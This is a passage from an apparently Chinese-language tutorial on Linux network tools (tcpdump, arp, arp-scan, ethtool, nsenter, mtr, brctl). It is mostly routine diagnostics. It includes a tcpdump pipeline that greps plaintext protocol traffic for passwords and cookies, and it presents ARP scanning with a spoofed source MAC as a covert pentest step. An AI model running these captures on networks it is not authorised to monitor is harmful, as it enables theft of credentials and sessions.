<pre><code class="language-bash">tcpdump 'tcp[13]=18'
</code></pre>
<p>TCP URG</p>
<pre><code class="language-bash">tcpdump 'tcp[13] &amp; 32!=0'
tcpdump 'tcp[tcpflags] == tcp-urg'
</code></pre>
<p>TCP ACK</p>
<pre><code class="language-bash">tcpdump 'tcp[13] &amp; 16!=0'
tcpdump 'tcp[tcpflags] == tcp-ack'
</code></pre>
<p>TCP PSH</p>
<pre><code class="language-bash">tcpdump 'tcp[13] &amp; 8!=0'
tcpdump 'tcp[tcpflags] == tcp-push'
</code></pre>
<p>TCP FIN</p>
<pre><code class="language-bash">tcpdump 'tcp[13] &amp; 1!=0'
tcpdump 'tcp[tcpflags] == tcp-fin'
</code></pre>
<h3 id="查找http包">查找http包<a hidden class="anchor" aria-hidden="true" href="#查找http包">¶</a></h3>
<p>查找 <code>user-agent</code> 信息</p>
<pre><code class="language-bash">tcpdump -vvAls0 | grep 'User-Agent:'
</code></pre>
<p>查找只是 <code>GET</code> 请求的流量</p>
<pre><code class="language-bash">tcpdump -vvAls0 | grep 'GET'
</code></pre>
<p>查找http客户端IP</p>
<pre><code class="language-bash">tcpdump -vvAls0 | grep 'Host:'
</code></pre>
<p>查询客户端cookie</p>
<pre><code class="language-bash">tcpdump -vvAls0 | grep 'Set-Cookie|Host:|Cookie:'
</code></pre>
<h3 id="查找dns流量">查找DNS流量<a hidden class="anchor" aria-hidden="true" href="#查找dns流量">¶</a></h3>
<pre><code class="language-bash">tcpdump -vvAs0 port 53
</code></pre>
<h3 id="查找对应流量的明文密码">查找对应流量的明文密码<a hidden class="anchor" aria-hidden="true" href="#查找对应流量的明文密码">¶</a></h3>
<pre><code class="language-bash">tcpdump port http or port ftp or port smtp or port imap or port pop3 or port telnet -lA | egrep -i -B5 'pass=|pwd=|log=|login=|user=|username=|pw=|passw=|passwd= |password=|pass:|user:|username:|password:|login:|pass |user '
</code></pre>
<h3 id="arp">arp<a hidden class="anchor" aria-hidden="true" href="#arp">¶</a></h3>
<p>ARP “地址解析协议” (<code>Address Resolution Protoco</code>)，是一种将IP地址映射到局域网上物理MAC地址的协议。</p>
<p><strong>为什么我们需要MAC地址？</strong></p>
<p>任何本地通信都将使用MAC地址，而不是IP地址。当一台计算机想在不同的网络上与另一台计算机通信时，将使用IP地址。IP地址就像你的邮寄收货地址，而MAC地址就像你的名字。在TCP/IP网络上，每台计算机都被分配IP地址，一些本地服务器的IP地址也被分配给网络客户主机。因此其在第2层（数据链路层）和第3层（网络层）之间工作。</p>
<p>在一个本地网络中，客户主机尝试在连接另外一个主机时（这里为同一网络，即同一广播域中），首先客户端会检查ARP缓存表（缓存IP于MAC的关系）。而 <code>arp</code> 命令可以管理系统的arp缓存表。它允许完全转储ARP缓存。</p>
<blockquote>
<p><strong>各系统下的安装</strong></p>
<ul>
<li>Ubuntu/Debian:  <code>net-tools</code>   ；<code>apt install net-tools</code></li>
<li>CentOS/Fedora: <code>net-tools</code>  ；<code>yum install -y net-tools</code></li>
<li>Apline：<code>net-tools</code> ；<code>apk add --no-cache net-tools</code></li>
</ul>
</blockquote>
<h3 id="查看arp条目">查看arp条目<a hidden class="anchor" aria-hidden="true" href="#查看arp条目">¶</a></h3>
<p><code>arp</code> 命令在没有任何选项的情况下将显示arp缓存表的内容。</p>
<pre><code class="language-bash">arp

Address                  HWtype  HWaddress           Flags Mask            Iface
correspond.fsddsfk.cn    ether   c4:71:fe:f1:9f:3f   C                     eth0
gateway                  ether   00:1f:ce:72:bd:8c   C                     eth0
</code></pre>
<h3 id="显示一个特定的arp条目">显示一个特定的arp条目<a hidden class="anchor" aria-hidden="true" href="#显示一个特定的arp条目">¶</a></h3>
<p>当arp缓存表很大不利于查看，并且仅需要拿到特定IP的条目的话，可以在 <code>-a</code> 后加具体IP地址来获取一个特定的条目。</p>
<pre><code class="language-bash">arp -a 46.17.40.155
correspond.faaaaa.cn (10.17.40.1) at c4:71:fe:f1:9f:3f [ether] on eth0
</code></pre>
<h3 id="显示指定接口的arp缓存表">显示指定接口的arp缓存表<a hidden class="anchor" aria-hidden="true" href="#显示指定接口的arp缓存表">¶</a></h3>
<p>如果仅希望显示一个接口的arp条目，可以通过 <code>arp</code> 命令 <code>-i</code>选项后跟接口名称。</p>
<pre><code class="language-bash">arp -i bond0

Address                HWtype  HWaddress           Flags Mask            Iface
usartdb02.exmpl.c      ether   17:a9:9b:f5:1a:7e   C                     bond0
usartdb02.exmpl.c      ether   f8:db:77:f2:5a:a2   C                     bond0
</code></pre>
<h3 id="删除一个arp条目">删除一个arp条目<a hidden class="anchor" aria-hidden="true" href="#删除一个arp条目">¶</a></h3>
<p>从arp缓存表中删除一个ip条目，可以使用 <code>arp</code> 命令-d选项，后跟IP地址。当一旦执行arp命令，ARP缓存表就会被刷新。</p>
<pre><code class="language-bash">arp -d 192.168.188.2
</code></pre>
<h3 id="向arp缓存添加一个条目">向arp缓存添加一个条目<a hidden class="anchor" aria-hidden="true" href="#向arp缓存添加一个条目">¶</a></h3>
<p>永久添加一个条目到arp缓存中，使用 <code>-s</code> 选项，需要指定IP地址和MAC地址外，还需要指定将条目添加到哪个接口。如：</p>
<pre><code class="language-bash">arp -s 192.168.188.133 -i eth0 00:0c:29:f6:1d:81
</code></pre>
<h3 id="清空arp缓存表">清空arp缓存表<a hidden class="anchor" aria-hidden="true" href="#清空arp缓存表">¶</a></h3>
<p>某些场景下，需要清空arp缓存，而 <code>arp</code> 命令并没有清空缓存表的操作，这时可以使用 <code>ip neigh</code>   而且<code>ip-route2</code> 最小化安装；基础容器等场景下也会存在。</p>
<pre><code class="language-bash">ip neigh flush dev eth0s
</code></pre>
<h3 id="显示格式">显示格式<a hidden class="anchor" aria-hidden="true" href="#显示格式">¶</a></h3>
<p>使用 <code>-e</code> 选项以linux标准格式输出arp缓存表</p>
<p>其输出格式中，ARP缓存表中的每个完整条目都将被标记为 <code>C</code> Complete entry。<code>M</code> （Permanent entry）表示永久条目；<code>P</code> （Published entry.）表示已发布条目标记。</p>
<pre><code class="language-bash">arp -ae

Address                  HWtype  HWaddress           Flags Mask            Iface
correspond.fsddsfk.cn    ether   c4:71:fe:fe:9f:2f   C                     eth0

arp -aen

Address                  HWtype  HWaddress           Flags Mask            Iface
36.17.40.111             ether   c4:71:fe:fe:9f:2f   C                     eth0
</code></pre>
<h2 id="arp-scan">arp-scan<a hidden class="anchor" aria-hidden="true" href="#arp-scan">¶</a></h2>
<p>网络扫描是渗透测试的步骤之一。有不同的和流行的工具来扫描网络线masscan，nmap等。Arp扫描。</p>
<p><code>arp-scan</code> 是专门设计用来扫描二层（网络层）的mac, arp数据包的工具（也可称为<code>ARP Sweep</code> 或 <code>MAC Scanner</code> ）；是一个非常快速的ARP包扫描程序，它可以显示子网中所有活动的IPv4设备。由于ARP是不可路由的，这种类型的扫描仪只能在本地LAN（本地子网或网段）上工作。</p>
<p><code>arp-scan</code> 显示所有活动设备，即使它们有防火墙。设备不能像躲避Ping一样躲避ARP包。</p>
<blockquote>
<p><strong>各系统下的安装</strong></p>
<ul>
<li>Ubuntu/Debian:  <code>arp-scan</code>   ；<code>apt install arp-scan</code></li>
<li>CentOS/Fedora: <code>arp-scan</code> (epel)  ；<code>yum install -y arp-scan</code></li>
<li>Apline：<code>arp-scan</code> ；<code>apk add --no-cache arp-scan</code></li>
</ul>
</blockquote>
<h3 id="扫描本地网络">扫描本地网络<a hidden class="anchor" aria-hidden="true" href="#扫描本地网络">¶</a></h3>
<p><code>arp-scan</code> 的最基本使用方法是扫描本地网络，使用<code>-l</code> 或 <code>--localnet</code> 可以扫描整个本地网络，但需要root权限</p>
<pre><code class="language-bash">arp-scan  --localnet

Interface: eth0, type: EN10MB, MAC: da:78:c8:7a:fb:26, IPv4: 195.133.11.43
Starting arp-scan 1.9.7 with 512 hosts (https://github.com/royhills/arp-scan)
195.133.10.1    00:1f:ce:72:bd:8c       QTECH LLC
195.133.10.2    56:85:8e:2b:cf:11       (Unknown: locally administered)
195.133.10.5    de:58:c6:5b:b5:c2       (Unknown: locally administered)
195.133.10.7    de:ed:ae:4b:7a:c8       (Unknown: locally administered)
195.133.10.6    d2:a6:f4:4c:f0:4b       (Unknown: locally administered)
</code></pre>
<h3 id="设置源mac">设置源mac<a hidden class="anchor" aria-hidden="true" href="#设置源mac">¶</a></h3>
<p>在apr扫描的过程中，会使用现有的mac地址进行请求，这样会留下网络痕迹，<code>arp-scan</code> 提供了修改源mac的功能。使用 <code>--destaddr</code> 或 <code>-T</code> 。</p>
<p>###指定特殊vlan</p>
<p>在网络设备中，一个接口可以实现多个网络，这使用了虚拟局域网VLAN（Virtual Local Area Network）的多路复用协议。如果接口是 <code>trunk</code> ，意味接口承载多个VLAN，我们可能需要指定VLAN id，可以使用 <code>--vlan</code> 或 <code>-Q</code>指定vlan id</p>
<pre><code class="language-bash">arp-scan -i eth0 -Q 10
</code></pre>
<h3 id="发现网络冲突">发现网络冲突<a hidden class="anchor" aria-hidden="true" href="#发现网络冲突">¶</a></h3>
<p><code>arp-scan</code> 也可用于发现IP冲突与识别设备等操，只需一个命令 <code>arp scan -l</code>。可以通过 <code>-i</code> 指定端口。</p>
<p>这里 <code>192.168.1.39</code> 冲突，因为出现了两次并且指定了不同的mac地址。</p>
<pre><code class="language-bash">arp-scan –I eth0 -l

192.168.1.10   00:1b:a9:63:a2:4c       BROTHER INDUSTRIES, LTD.
192.168.1.30   00:1e:8f:58:ec:49       CANON INC.
192.168.1.33   00:25:4b:1b:10:20       Apple, Inc
192.168.1.37   10:9a:dd:55:d7:95       Apple Inc
192.168.1.38   20:c9:d0:27:8d:56       (Unknown)
192.168.1.39   d4:85:64:4d:35:be       Hewlett Packard
192.168.1.39   00:0b:46:e4:8e:6d       Cisco (DUP: 2)
192.168.1.40   90:2b:34:18:59:c0       (Unknown)
</code></pre>
<h2 id="ethtool">ethtool<a hidden class="anchor" aria-hidden="true" href="#ethtool">¶</a></h2>
<p><code>ethtool</code> 命令用于 显示, 配置以太网设备。可以在Linux中使用此工具更改网卡速度, 自动协商, LAN唤醒设置, 双工模式。</p>
<blockquote>
<p><strong>各系统下的安装</strong></p>
<ul>
<li>Ubuntu/Debian:  <code>ethtool</code>   ；<code>apt install ethtool</code></li>
<li>CentOS/Fedora: <code>ethtool</code> (epel)  ；<code>yum install -y ethtool</code></li>
<li>Apline：<code>ethtool</code> ；<code>apk add --no-cache ethtool</code></li>
</ul>
</blockquote>
<h3 id="列出以太网设备属性">列出以太网设备属性<a hidden class="anchor" aria-hidden="true" href="#列出以太网设备属性">¶</a></h3>
<pre><code class="language-bash">ethtool eth0

Settings for eth0:
        Supported ports: [ ]
        Supported link modes:   Not reported
        Supported pause frame use: No
        Supports auto-negotiation: No
        Supported FEC modes: Not reported
        Advertised link modes:  Not reported
        Advertised pause frame use: No
        Advertised auto-negotiation: No
        Advertised FEC modes: Not reported
        Speed: Unknown!
        Duplex: Unknown! (255)
        Port: Other
        PHYAD: 0
        Transceiver: internal
        Auto-negotiation: off
        Link detected: yes
</code></pre>
<h3 id="查看网络接口于容器内接口的对应关系">查看网络接口于容器内接口的对应关系<a hidden class="anchor" aria-hidden="true" href="#查看网络接口于容器内接口的对应关系">¶</a></h3>
<p>可以通过ethtool查看容器的网卡对，通过<code>-S</code> 加接口设备名，<code>-S</code> 为统计信息</p>
<p>在宿主机上 使用命令查看，其中<code>peer_ifindex: 767</code> 对应容器内 <code>ip link</code> 的编号</p>
<pre><code class="language-bash">ethtool -S veth45562ed 
</code></pre>
<p>容器内</p>
<pre><code>$ ip link
1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN mode DEFAULT group default
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
767: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP mode DEFAULT group default
    link/ether 02:42:ac:11:00:03 brd ff:ff:ff:ff:ff:ff
</code></pre>
<h2 id="nsenter">nsenter<a hidden class="anchor" aria-hidden="true" href="#nsenter">¶</a></h2>
<p>nsenter是一款可以进入进程的名称空间中。例如，如果一个容器以非 root 用户身份运行，而使用 <code>docker exec</code> 进入其中后，但该容器没有安装 <code>sudo</code> 或未 <code>netstat</code> ，并且您想查看其当前的网络属性，如开放端口，这种场景下将如何做到这一点？<em><strong>nsenter</strong></em> 就是用来解决这个问题的。</p>
<p><strong>nsenter</strong> (<em>namespace enter</em>) 可以在容器的宿主机上使用 <em>nsenter</em> 命令进入容器的命名空间，以容器视角使用宿主机上的相应网络命令进行操作。==当然需要拥有 <em>root</em> 权限==</p>
<blockquote>
<p><strong>各系统下的安装</strong> <sup><a href="#4">[4]</a></sup></p>
<ul>
<li>Ubuntu/Debian: <code>util-linux</code>  ；<code>apt-get install -y util-linux</code></li>
<li>CentOS/Fedora: <code>util-linux</code> ；<code>yum install -y util-linux</code></li>
<li>Apline：<code>util-linux</code> ；<code>apk add util-linux --no-cache</code></li>
</ul>
</blockquote>
<p><em>nsenter</em> 的使用语法为，<code>nsenter -t pid -n &lt;commond&gt;</code>，<code>-t</code> 接 进程ID号，<code>-n</code> 表示进入名称空间内，<code>&lt;commond&gt;</code> 为执行的命令。更多的内容可以参考 <sup><a href="#3">[3]</a></sup></p>
<p>实例：如我们有一个Pod进程ID为30858，进入该Pod名称空间内执行 <code>ifconfig</code> ，如下列所示</p>
<pre><code class="language-bash">$ ps -ef|grep tail
root      17636  62887  0 20:19 pts/2    00:00:00 grep --color=auto tail
root      30858  30838  0 15:55 ?        00:00:01 tail -f

$ nsenter -t 30858 -n ifconfig
eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1480
        inet 192.168.1.213  netmask 255.255.255.0  broadcast 192.168.1.255
        ether 5e:d5:98:af:dc:6b  txqueuelen 0  (Ethernet)
        RX packets 92  bytes 9100 (8.8 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 92  bytes 8422 (8.2 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 5  bytes 448 (448.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 5  bytes 448 (448.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

net1: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
        inet 10.1.0.201  netmask 255.255.255.0  broadcast 10.1.0.255
        ether b2:79:f9:dd:2a:10  txqueuelen 0  (Ethernet)
        RX packets 228  bytes 21272 (20.7 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 216  bytes 20272 (19.7 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
</code></pre>
<h3 id="如何定位pod名称空间">如何定位Pod名称空间<a hidden class="anchor" aria-hidden="true" href="#如何定位pod名称空间">¶</a></h3>
<p>首先需要确定Pod所在的节点名称</p>
<pre><code class="language-bash">$ kubectl get pods -owide |awk '{print $1,$7}'
NAME NODE
netbox-85865d5556-hfg6v master-machine
netbox-85865d5556-vlgr4 node01
</code></pre>
<p>如果Pod不在当前节点还需要用IP登录则还需要查看IP（可选）</p>
<pre><code class="language-bash">$ kubectl get pods -owide |awk '{print $1,$6,$7}'
NAME IP NODE
netbox-85865d5556-hfg6v 192.168.1.213 master-machine
netbox-85865d5556-vlgr4 192.168.0.4 node01
</code></pre>
<p>接下来，登录节点，获取容器lD，如下列所示，每个pod默认有一个 <em>pause</em> 容器，其他为用户yaml文件中定义的容器，理论上所有容器共享相同的网络命名空间，排查时可任选一个容器。</p>
<pre><code class="language-bash">$ docker ps |grep netbox-85865d5556-hfg6v
6f8c58377aae   f78dd05f11ff                                                    &quot;tail -f&quot;                45 hours ago   Up 45 hours             k8s_netbox_netbox-85865d5556-hfg6v_default_4a8e2da8-05d1-4c81-97a7-3d76343a323a_0
b9c732ee457e   registry.cn-hangzhou.aliyuncs.com/google_containers/pause:3.1   &quot;/pause&quot;                 45 hours ago   Up 45 hours             k8s_POD_netbox-85865d5556-hfg6v_default_4a8e2da8-05d1-4c81-97a7-3d76343a323a_0
</code></pre>
<p>接下来获得获取容器在节点系统中对应的进程号，如下所示</p>
<pre><code class="language-bash">$ docker inspect --format &quot;{{ .State.Pid }}&quot; 6f8c58377aae
30858
</code></pre>
<p>最后就可以通过 <em>nsenter</em> 进入容器网络空间执行命令了</p>
<h2 id="paping">paping<a hidden class="anchor" aria-hidden="true" href="#paping">¶</a></h2>
<p><strong>paping</strong> 命令可对目标地址指定端口以TCP协议进行连续ping，通过这种特性可以弥补 <em>ping</em> ICMP协议，以及 <em>nmap</em> , <em>telnet</em> 只能进行一次操作的的不足；通常情况下会用于测试端口连通性和丢包率</p>
<p>paping download：<a href="https://code.google.com/archive/p/paping/" target="_blank"
   rel="noopener nofollow noreferrer" >paping</a></p>
<p><em>paping</em> 还需要安装以下依赖，这取决于你安装的 <em>paping</em> 版本</p>
<ul>
<li>RedHat/CentOS：<code>yum install -y libstdc++.i686 glibc.i686</code></li>
<li>Ubuntu/Debian：最小化安装无需依赖</li>
</ul>
<pre><code class="language-bash">$ paping -h
paping v1.5.5 - Copyright (c) 2011 Mike Lovell

Syntax: paping [options] destination

Options:
 -?, --help     display usage
 -p, --port N   set TCP port N (required)
     --nocolor  Disable color output
 -t, --timeout  timeout in milliseconds (default 1000)
 -c, --count N  set number of checks to N
</code></pre>
<h2 id="mtr">mtr<a hidden class="anchor" aria-hidden="true" href="#mtr">¶</a></h2>
<p><strong>mtr</strong> 是一个跨平台的网络诊断工具，将 <strong>traceroute</strong> 和 <strong>ping</strong> 的功能结合到一个工具。与 <em>traceroute</em> 不同的是 <em>mtr</em> 显示的信息比起 <em>traceroute</em> 更加丰富：通过 <em>mtr</em> 可以确定网络的条数，并且可以同时打印响应百分比以及网络中各跳跃点的响应时间。</p>
<blockquote>
<p><strong>各系统下的安装</strong></p>
<ul>
<li>Ubuntu/Debian: <code>mtr</code>  ；<code>apt-get install -y mtr</code></li>
<li>CentOS/Fedora: <code>mtr</code> ；<code>yum install -y mtr</code></li>
<li>Apline：<code>mtr</code> ；<code>apk add mtr --no-cache</code></li>
</ul>
</blockquote>
<h3 id="简单的使用示例">简单的使用示例<a hidden class="anchor" aria-hidden="true" href="#简单的使用示例">¶</a></h3>
<p>最简单的示例，就是后接域名或IP，这将跟踪整个路由</p>
<pre><code class="language-bash">$ mtr google.com

Start: Thu Jun 28 12:10:13 2018
HOST: TecMint                     Loss%   Snt   Last   Avg  Best  Wrst StDev
  1.|-- 192.168.0.1                0.0%     5    0.3   0.3   0.3   0.4   0.0
  2.|-- 5.5.5.211                  0.0%     5    0.7   0.9   0.7   1.3   0.0
  3.|-- 209.snat-111-91-120.hns.n 80.0%     5    7.1   7.1   7.1   7.1   0.0
  4.|-- 72.14.194.226              0.0%     5    1.9   2.9   1.9   4.4   1.1
  5.|-- 108.170.248.161            0.0%     5    2.9   3.5   2.0   4.3   0.7
  6.|-- 216.239.62.237             0.0%     5    3.0   6.2   2.9  18.3   6.7
  7.|-- bom05s12-in-f14.1e100.net  0.0%     5    2.1   2.4   2.0   3.8   0.5
</code></pre>
<p><code>-n</code> 强制 <em>mtr</em> 打印 IP地址而不是主机名</p>
<pre><code class="language-bash">$ mtr -n google.com

Start: Thu Jun 28 12:12:58 2018
HOST: TecMint                     Loss%   Snt   Last   Avg  Best  Wrst StDev
  1.|-- 192.168.0.1                0.0%     5    0.3   0.3   0.3   0.4   0.0
  2.|-- 5.5.5.211                  0.0%     5    0.9   0.9   0.8   1.1   0.0
  3.|-- ???                       100.0     5    0.0   0.0   0.0   0.0   0.0
  4.|-- 72.14.194.226              0.0%     5    2.0   2.0   1.9   2.0   0.0
  5.|-- 108.170.248.161            0.0%     5    2.3   2.3   2.2   2.4   0.0
  6.|-- 216.239.62.237             0.0%     5    3.0   3.2   3.0   3.3   0.0
  7.|-- 172.217.160.174            0.0%     5    3.7   3.6   2.0   5.3   1.4
</code></pre>
<p><code>-b</code> 同时显示IP地址与主机名</p>
<pre><code class="language-bash">$ mtr -b google.com

Start: Thu Jun 28 12:14:36 2018
HOST: TecMint                     Loss%   Snt   Last   Avg  Best  Wrst StDev
  1.|-- 192.168.0.1                0.0%     5    0.3   0.3   0.3   0.4   0.0
  2.|-- 5.5.5.211                  0.0%     5    0.7   0.8   0.6   1.0   0.0
  3.|-- 209.snat-111-91-120.hns.n  0.0%     5    1.4   1.6   1.3   2.1   0.0
  4.|-- 72.14.194.226              0.0%     5    1.8   2.1   1.8   2.6   0.0
  5.|-- 108.170.248.209            0.0%     5    2.0   1.9   1.8   2.0   0.0
  6.|-- 216.239.56.115             0.0%     5    2.4   2.7   2.4   2.9   0.0
  7.|-- bom07s15-in-f14.1e100.net  0.0%     5    3.7   2.2   1.7   3.7   0.9
</code></pre>
<p><code>-c</code> 跟一个具体的值，这将限制 <em>mtr</em> ping的次数，到达次数后会退出</p>
<pre><code class="language-bash">$ mtr -c5 google.com
</code></pre>
<p>如果需要指定次数，并且在退出后保存这些数据，使用 <code>-r</code> flag</p>
<pre><code class="language-bash">$ mtr -r -c 5 google.com &gt;  1
$ cat 1
Start: Sun Aug 21 22:06:49 2022
HOST: xxxxx.xxxxx.xxxx.xxxx Loss%   Snt   Last   Avg  Best  Wrst StDev
  1.|-- gateway                    0.0%     5    0.6 146.8   0.6 420.2 191.4
  2.|-- 212.xx.21.241              0.0%     5    0.4   1.0   0.4   2.3   0.5
  3.|-- 188.xxx.106.124            0.0%     5    0.7   1.1   0.7   2.1   0.5
  4.|-- ???                       100.0     5    0.0   0.0   0.0   0.0   0.0
  5.|-- 72.14.209.89               0.0%     5   43.2  43.3  43.1  43.3   0.0
  6.|-- 108.xxx.250.33             0.0%     5   43.2  43.1  43.1  43.2   0.0
  7.|-- 108.xxx.250.34             0.0%     5   43.7  43.6  43.5  43.7   0.0
  8.|-- 142.xxx.238.82             0.0%     5   60.6  60.9  60.6  61.2   0.0
  9.|-- 142.xxx.238.64             0.0%     5   59.7  67.5  59.3  89.8  13.2
 10.|-- 142.xxx.37.81              0.0%     5   62.7  62.9  62.6  63.5   0.0
 11.|-- 142.xxx.229.85             0.0%     5   61.0  60.9  60.7  61.3   0.0
 12.|-- xx-in-f14.1e100.net  0.0%     5   59.0  58.9  58.9  59.0   0.0
</code></pre>
<p>默认使用的是 ICMP 协议 <code>-i</code> ，可以指定 <code>-u</code>,  <code>-t</code> 使用其他协议</p>
<pre><code class="language-bash">mtr --tcp google.com
</code></pre>
<p><code>-m</code> 指定最大的跳数</p>
<pre><code class="language-bash">mtr -m 35 216.58.223.78
</code></pre>
<p><code>-s</code> 指定包的大小</p>
<h3 id="mtr输出的数据">mtr输出的数据<a hidden class="anchor" aria-hidden="true" href="#mtr输出的数据">¶</a></h3>
<table>
<thead>
<tr>
<th>colum</th>
<th>describe</th>
</tr>
</thead>
<tbody>
<tr>
<td>last</td>
<td>最近一次的探测延迟值</td>
</tr>
<tr>
<td>avg</td>
<td>探测延迟的平均值</td>
</tr>
<tr>
<td>best</td>
<td>探测延迟的最小值</td>
</tr>
<tr>
<td>wrst</td>
<td>探测延迟的最大值</td>
</tr>
<tr>
<td>stdev</td>
<td>标准偏差。越大说明相应节点越不稳定</td>
</tr>
</tbody>
</table>
<h3 id="丢包判断">丢包判断<a hidden class="anchor" aria-hidden="true" href="#丢包判断">¶</a></h3>
<p>任一节点的 <code>Loss%</code>（丢包率）如果不为零，则说明这一跳网络可能存在问题。导致相应节点丢包的原因通常有两种。</p>
<ul>
<li>运营商基于安全或性能需求，人为限制了节点的ICMP发送速率，导致丢包。</li>
<li>节点确实存在异常，导致丢包。可以结合异常节点及其后续节点的丢包情况，来判定丢包原因。</li>
</ul>
<blockquote>
<p>Notes:</p>
<ul>
<li>如果随后节点均没有丢包，则通常说明异常节点丢包是由于运营商策略限制所致。可以忽略相关丢包。</li>
<li>如果随后节点也出现丢包，则通常说明节点确实存在网络异常，导致丢包。对于这种情况，如果异常节点及其后续节点连续出现丢包，而且各节点的丢包率不同，则通常以最后几跳的丢包率为准。如链路测试在第5, 6, 7跳均出现了丢包。最终丢包情况以第7跳作为参考。</li>
</ul>
</blockquote>
<h3 id="延迟判断">延迟判断<a hidden class="anchor" aria-hidden="true" href="#延迟判断">¶</a></h3>
<p>由于链路抖动或其它因素的影响，节点的 <em>Best</em> 和 <em>Worst</em> 值可能相差很大。而 <em>Avg</em>（平均值）统计了自链路测试以来所有探测的平均值，所以能更好的反应出相应节点的网络质量。而 <em>StDev</em>（标准偏差值）越高，则说明数据包在相应节点的延时值越不相同（越离散）。所以标准偏差值可用于协助判断 <em>Avg</em> 是否真实反应了相应节点的网络质量。例如，如果标准偏差很大，说明数据包的延迟是不确定的。可能某些数据包延迟很小（例如：25ms），而另一些延迟却很大（例如：350ms），但最终得到的平均延迟反而可能是正常的。所以此时 <em>Avg</em> 并不能很好的反应出实际的网络质量情况。</p>
<p>这就需要结合如下情况进行判断：</p>
<ul>
<li>如果 <em>StDev</em> 很高，则同步观察相应节点的 <em>Best</em> 和 <em>wrst</em>，来判断相应节点是否存在异常。</li>
<li>如果<em>StDev</em> 不高，则通过Avg来判断相应节点是否存在异常。</li>
</ul>
<h2 id="brctl-supa-href55asup">brctl <sup><a href="#5">[5]</a></sup><a hidden class="anchor" aria-hidden="true" href="#brctl-supa-href55asup">¶</a></h2>
<p><em><strong>brctl</strong></em> 是用于创建和操作 Linux Bridge 的命令行工具，</p>
<blockquote>
<p><strong>各系统下的安装</strong></p>
<ul>
<li>Ubuntu/Debian: <code>bridge-utils</code>  ；<code>apt-get install -y bridge-utils</code></li>
<li>CentOS/Fedora: <code> bridge-utils</code> ；<code>yum install -y bridge-utils</code></li>
<li>Apline：<code>bridge-utils</code> ；<code>apk add bridge-utils --no-cache</code></li>
</ul>
</blockquote>
<h3 id="显示所有启用的网桥的设备">显示所有启用的网桥的设备<a hidden class="anchor" aria-hidden="true" href="#显示所有启用的网桥的设备">¶</a></h3>
<p>使用 <code>brctl show</code> 查看当前节点可用的 bridge</p>
<pre><code class="language-bash">$ brctl show
bridge name bridge id STP enabled interfaces
br0 8000.000d3a8a7868 no eth1
vnet0
virbr0 8000.5254005098ae yes virbr0-nic
</code></pre>
<h3 id="创建网桥">创建网桥<a hidden class="anchor" aria-hidden="true" href="#创建网桥">¶</a></h3>
<p>使用 <code>brctl addbr &lt;name&gt;</code> 可以创建出一个Linux Bridge</p>
<pre><code class="language-bash">brctl addbr dev
</code></pre>
<h3 id="在网桥上添加接口">在网桥上添加接口<a hidden class="anchor" aria-hidden="true" href="#在网桥上添加接口">¶</a></h3>
<p>使用 <code>brctl addif &lt;bridge_name&gt; &lt;interface_name&gt;</code> 可以在一个已经存在的 bridge 上添加一个接口</p>
<pre><code class="language-bash">$ brctl addif br0 eth1
</code></pre>
<p>指定多个 <code>&lt;interface_name&gt;</code>  会向网桥上添加多个接口</p>
<pre><code class="language-bash">$ brctl addif br0 enp0s3 enp1s3
</code></pre>
<h3 id="删除网桥">删除网桥<a hidden class="anchor" aria-hidden="true" href="#删除网桥">¶</a></h3>
<p>使用 <code>brctl delbr &lt;bridge_name&gt;</code> 可以删除一个网桥</p>
<pre><code class="language-bash">$ brctl delbr br0
</code></pre>
<h3 id="检查网桥-stf-信息">检查网桥 STF 信息<a hidden class="anchor" aria-hidden="true" href="#检查网桥-stf-信息">¶</a></h3>
<p>使用 <code>brctl showstp &lt;bridge_name&gt;</code> 可以查看网桥的STF信息</p>
<pre><code class="language-bash">$ brctl showstp br0
br0
bridge id 8000.000000000000
designated root 8000.000000000000
root port 0 path cost 0
max age 20.00 bridge max age 20.00
hello time 2.00 bridge hello time 2.00
forward delay 15.00 bridge forward delay 15.00
ageing time 300.00
hello timer 0.00 tcn timer 0.00
topology change timer 0.00 gc timer 0.00
flags
</code></pre>
<h3 id="从网桥上删除接口">从网桥上删除接口<a hidden class="anchor" aria-hidden="true" href="#从网桥上删除接口">¶</a></h3>
<p>使用 <code>brctl delif &lt;bridge_name&gt; &lt;interface_name&gt;</code> 可以从网桥上删除接口。</p>
<pre><code class="language-bash">$ brctl delif br0 enp0s3
</code></pre>
<h3 id="开启关闭生成树协议">开启/关闭生成树协议<a hidden class="anchor" aria-hidden="true" href="#开启关闭生成树协议">¶</a></h3>
<p>使用 <code>brctl stp &lt;bridge_name&gt; on/off</code> 可以选择开启或关闭生成树协议</p>
<pre><code class="language-bash">$ brctl stp br0 off
$ brctl stp br0 on
</code></pre>
<h3 id="查看网桥上学到的mac地址">查看网桥上学到的MAC地址<a hidden class="anchor" aria-hidden="true" href="#查看网桥上学到的mac地址">¶</a></h3>
<p>使用 <code>brctl showmacs &lt;bridge_name&gt;</code> 可以查看网桥上学到的所有设备的MAC地址。</p>
<pre><code class="language-bash">$ brctl showmacs br0
port no mac addr                is local?       ageing timer
1       00:74:16:87:14:de       yes                0.00
</code></pre>
<h3 id="修改stp值">修改STP值<a hidden class="anchor" aria-hidden="true" href="#修改stp值">¶</a></h3>
<p>如果需要修改 STP 参数值，可以通过 <code>brctl setageing &lt;bridge_name&gt; &lt;value&gt;</code> 来修改</p>
<pre><code class="language-bash">$ brctl setageing br0 100
</code></pre>
<h2 id="bridge-supa-href66asup">bridge <sup><a href="#6">[6]</a></sup><a hidden class="anchor" aria-hidden="true" href="#bridge-supa-href66asup">¶</a></h2>
<p><em><strong>bridge</strong></em> 是一款用于展示和操作网桥地址和设备的命令，通常情况下</p>
<blockquote>
